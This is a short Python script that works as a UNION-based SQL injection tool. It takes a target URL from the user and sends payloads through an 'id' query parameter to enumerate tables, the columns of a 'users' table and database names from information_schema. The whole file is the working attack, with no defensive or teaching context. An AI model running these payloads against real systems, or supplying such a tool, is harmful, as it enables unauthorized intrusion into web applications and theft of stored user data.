import requests
import re

url = input("Enter URL: ")

# Function to extract table names
def extract_tables(response):
    tables = re.findall(r'<table>(.*?)</table>', response.text, re.DOTALL)
    return tables

# Function to extract column names
def extract_columns(response, table):
    columns_match = re.findall(f'<table>(.*?)</table>', response.text, re.DOTALL)
    if columns_match:
        columns = columns_match[0]
        column_names = re.findall(r'<th>(.*?)</th>', columns)
        return column_names
    else:
        print("[-] Extract faild! ")
        return []  # Return an empty list if no match is found

# Function to extract database names
def extract_databases(response):
    databases = re.findall(r'Database: (.*?)<br>', response.text)
    return databases

# Function to perform SQL injection
def perform_injection(payload):
    injection_url = f"{url}?id={payload}"
    response = requests.get(injection_url)
    return response

# Main function to find columns, tables, and databases
def find_sql_injection():
    # Payload to extract table names
    payload = "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,table_name FROM information_schema.tables--"
    response = perform_injection(payload)
    tables = extract_tables(response)
    print(f"[+] Try to Extract Tables: {', '.join(tables)}")

    # Payload to extract column names
    payload = "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name='users'--"
    response = perform_injection(payload)
    columns = extract_columns(response, 'users')
    print(f"[+] Try to Extract Columns (users): {', '.join(columns)}")

    # Payload to extract database names
    payload = "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,schema_name FROM information_schema.schemata--"
    response = perform_injection(payload)
    databases = extract_databases(response)
    print(f"[+] Try to Extract Databases: {', '.join(databases)}")

# Run the script
find_sql_injection()
